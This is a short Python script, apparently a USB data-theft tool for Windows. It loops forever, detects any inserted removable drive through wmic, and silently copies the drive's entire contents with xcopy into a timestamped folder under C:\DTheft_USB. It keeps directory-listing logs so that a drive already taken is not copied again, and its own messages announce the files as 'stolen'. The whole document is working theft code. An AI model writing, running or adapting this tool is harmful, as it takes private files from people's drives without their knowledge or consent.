

import subprocess, os, filecmp, shutil
from datetime import datetime
from time import sleep

while True:

    # path & variables 

    tmp_file = r"C:\Temp\log.txt"

    home_folder = r"C:\DTheft_USB"
    now = datetime.now()
    dt_string = now.strftime("%a%d%y%H%M%S")

    newfolder = home_folder+chr(92)+dt_string+chr(92) 
    files = str(newfolder)
    makelog = str(newfolder)+"log.txt"
    makefolder = str(newfolder)
    make_abs = os.path.abspath(makelog)


    output = subprocess.check_output("wmic logicaldisk get caption, drivetype", shell=True)
    data = str(output)
    x = data.find("2")
    if not x == -1 :

        get = data.find("2")
        cvt = int(get)
        divise = cvt - 9
        getD = data[divise:cvt]
        global lecteur
        lecteur = getD[0:2]
        print("Your driver stolen is: ", lecteur)
        path_dir = "dir /W "+lecteur+">"+tmp_file
        full_path_dir = str(path_dir)
        cmd = "cmd /C" +full_path_dir


        os.system(cmd)      # Creat the log file into c:	emp\log.txt
        



        if not os.path.exists(home_folder):
            os.system("cls")
            print("Folder name is: ",dt_string)
            add_folder = "md "+newfolder
            os.system(add_folder)

            shutil.copyfile(tmp_file, make_abs)
            dthief_files = "xcopy "+lecteur+"\*.* /Q /E /Y "+files+"*.*"
            os.system(dthief_files)
            

        elif os.path.exists(home_folder):
            list_comp = []
            for dirpath, dirnames, filenames in os.walk(home_folder):
                for filenames in [f for f in filenames if f.endswith("log.txt")]:
                    log = os.path.join(dirpath, filenames)
                    comp = filecmp.cmp(log, tmp_file)                 
                    list_comp.append(comp)
                    

            
            print(list_comp)
            if True in list_comp :
                os.system("cls")
                print("file found : ")
                print(" ")
                for content in os.listdir(lecteur):
                    print(content)
                    sleep(1.0)
                    

            else :
                os.system("cls")
                print("Folder name is: ",dt_string)
                print(" ")
                add_folder = "md "+newfolder
                os.system(add_folder)

                shutil.copyfile(tmp_file, make_abs)
                print("Stealing file Successfully  ...")
                print(" ")
                dthief_files = "xcopy "+lecteur+"\*.* /Q /E /Y "+files+"*.*"
                os.system(dthief_files)
                for content in os.listdir(lecteur):
                    print(content)
                    sleep(2.0)
                    
                            
    else :
        print("USB (not found) ")
        sleep(1.5)





        
